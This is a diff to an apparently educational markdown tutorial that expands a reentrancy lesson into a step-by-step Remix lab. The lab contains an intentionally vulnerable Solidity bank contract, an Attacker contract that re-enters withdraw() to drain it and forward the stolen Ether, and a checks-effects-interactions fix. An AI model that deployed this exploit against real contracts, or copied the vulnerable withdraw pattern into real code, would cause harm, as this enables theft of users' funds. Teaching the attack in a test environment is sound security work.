@@ -46,49 +46,134 @@ Imagine a bank where:
 
 This is exactly how a reentrancy attack works.  
 
-### Vulnerable Smart Contract  
-```solidity  
-contract VulnerableBank {  
-    mapping(address => uint) public balances;  
+---
 
-    function deposit() public payable {  
-        balances[msg.sender] += msg.value;  
-    }  
+## ✅ Step-by-Step Guide to Test the VulnerableBank and Attacker Contract in Remix
 
-    function withdraw() public {  
-        require(balances[msg.sender] > 0);  
+### 🔨 Step 1: Write the `VulnerableBank` contract
 
-        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");  
-        require(sent);  
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-        balances[msg.sender] = 0; // Too late! Attacker already re-entered.  
-    }  
-}  
-```  
+contract VulnerableBank {
+    mapping(address => uint) public balances;
 
-### How the Attack Works  
-An attacker deploys this contract:  
-```solidity  
-contract Attacker {  
-    VulnerableBank public bank;  
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
 
-    constructor(address _bank) {  
-        bank = VulnerableBank(_bank);  
-    }  
+    function withdraw() public {
+        require(balances[msg.sender] > 0, "No funds");
 
-    fallback() external payable {  
-        if (address(bank).balance >= 1 ether) {  
-            bank.withdraw(); // Calls back into VulnerableBank  
-        }  
-    }  
+        // ❌ vulnerable: Ether sent before state update
+        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
+        require(sent, "Failed to send");
 
-    function attack() external payable {  
-        require(msg.value >= 1 ether);  
-        bank.deposit{value: 1 ether}();  
-        bank.withdraw(); // Starts the attack  
-    }  
-}  
-```  
+        balances[msg.sender] = 0;
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+---
+
+### 🧱 Step 2: Deploy the `VulnerableBank` contract
+
+- In Remix, compile and deploy it first.
+- Copy the deployed address — you’ll need this in the next step.
+
+---
+
+### 🔨 Step 3: Write the `Attacker` contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IVulnerableBank {
+    function deposit() external payable;
+    function withdraw() external;
+}
+
+contract Attacker {
+    IVulnerableBank public bank;
+    address public owner;
+    uint public attackCount;
+
+    constructor(address _bankAddress) {
+        bank = IVulnerableBank(_bankAddress);
+        owner = msg.sender;
+    }
+
+    fallback() external payable {
+        if (address(bank).balance >= 1 ether && attackCount < 5) {
+            attackCount++;
+            bank.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Send at least 1 ETH");
+        bank.deposit{value: 1 ether}();  // Step 1: deposit
+        bank.withdraw();                // Step 2: start reentrant attack
+    }
+
+    function withdrawFunds() public {
+        require(msg.sender == owner, "Not owner");
+        payable(owner).transfer(address(this).balance);
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    receive() external payable {}
+}
+```
+
+---
+
+### 🧪 Step 4: Setup and Run the Test
+
+#### A. Fund the bank
+
+Before launching the attack, you need to **fund the bank** contract with some Ether so the attack has something to drain.
+
+1. In Remix:
+   - Choose the **VulnerableBank contract**
+   - Use the **`deposit()`** function
+   - In the value field (top-left corner), enter something like `5 ether`
+   - Click `deposit()`
+
+Repeat this using **other test accounts** to simulate multiple users funding the bank.
+
+#### B. Deploy Attacker
+
+- Paste the VulnerableBank’s address into the Attacker contract constructor
+- Deploy the Attacker contract
+
+#### C. Launch the Attack
+
+1. Change the selected account in Remix to the **Attacker’s owner account**
+2. Enter `1 ether` in the value box
+3. Call `attack()` on the Attacker contract
+
+✅ You’ll see that the attacker withdraws multiple times before their balance is updated, draining the contract.
+
+---
+
+### ✅ Step 5: Confirm Exploit Worked
+
+- Use `getBalance()` on both contracts:
+  - The **VulnerableBank** should now be **drained or nearly empty**
+  - The **Attacker contract** should hold **multiple ETH**
+- You can call `withdrawFunds()` to send all stolen funds to the attacker’s owner wallet
+
+---
 
 ### How to Fix It: Checks-Effects-Interactions  
 Always **update state before** making external calls.  
@@ -103,13 +188,6 @@ function withdraw() public {
     require(sent);  
 }  
 ```  
-
-**Test in Remix:**  
-1. Deploy `VulnerableBank`.  
-2. Deploy `Attacker` with the bank’s address.  
-3. Call `attack()` with 1 ETH.  
-4. Watch the bank’s balance drain to zero.  
-5. Now deploy the fixed version—attack fails!  
 
 ---  
 
